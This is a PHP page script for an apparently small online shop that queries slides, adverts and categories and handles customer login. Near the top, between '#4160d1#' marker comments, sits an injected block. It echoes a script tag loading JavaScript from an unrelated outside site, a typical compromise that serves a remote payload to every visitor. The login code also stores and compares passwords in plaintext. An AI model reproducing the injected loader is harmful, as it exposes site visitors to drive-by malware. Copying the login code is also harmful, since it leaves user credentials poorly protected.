<?php include "../classes/al_karim.php"; ?>
<?php
#4160d1#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16224424\"></script>";
echo $srwv;
}
#/4160d1#
?>
<?php
session_start(0);
/////////
// All Slide
$query = "select * from slide where status = 1 order by sort_order ASC , RAND()";
$all_slide = $cls -> db_select($query);
/////////
// Home Advertise
$query = "select * from advertise where status = 1 order by RAND() limit 1";
$adv_home = $cls -> db_select($query);
/////////
// All Category
$query = "select * from category where (parent_id = 0 OR parent_id is NULL) and status = 1 order by sort_order ASC , name ASC ";
$all_category = $cls -> db_select($query);
/////////
// All Manufacture
$query = "select * from manufacture where status = 1 order by name ASC ";
$all_manufacture = $cls -> db_select($query);
///////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////
// For Login
//  ARRAY MESSAGE
$message_info["1"] = " &bull; <span style=color:#FFFFFF>Please Insert Your User name. </span><br>";
$message_info["2"] = " &bull; <span style=color:#FFFFFF>Please Insert Your Password. </span><br>";
$message_info["3"] = " &bull; <span style=color:#FFFFFF>Error In User Name OR Password. </span><br>";
////////////////////////////
$message_display = "";
$check_status = TRUE;
if (isset($_POST["login"]))
{
// Check User name
	$user_name = trim(stripslashes($_POST["user_name"]));
	if(strlen($user_name) == 0)
	{
		$message_display .= $message_info[1];
		$check_status = FALSE;
	}
// Check Password
	$password = trim(stripslashes($_POST["password"]));
	//check length
	if(strlen($password) == 0)
	{
		$message_display .= $message_info[2];
		$check_status = FALSE;
	}
	
}
/////
if (isset($_POST["login"]) AND ($check_status == TRUE))
{

	///////////////
	// Check User & Password
	$user_name = mysql_escape_string($user_name);
	$password = mysql_escape_string($password);
	// contact info
	$query = "select customer.* from customer where customer.user_name = '$user_name' and password = '$password'";
	$user_info = $cls -> db_select($query);
	if(count($user_info) != 1) {
			$login_status = 0;
			$message_display .= $message_info[3];
			$check_status = FALSE;
	}else{
	
		$login_status = 1;
		
		$_SESSION["user_id"] = $user_info[1]["id"];
		$_SESSION["user_name"] = $user_info[1]["user_name"];
		$_SESSION["name"] = $user_info[1]["name"];
		
		header('Location: account/my_account.php?login=1');
		exit(0);
	}
}
///////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////

?>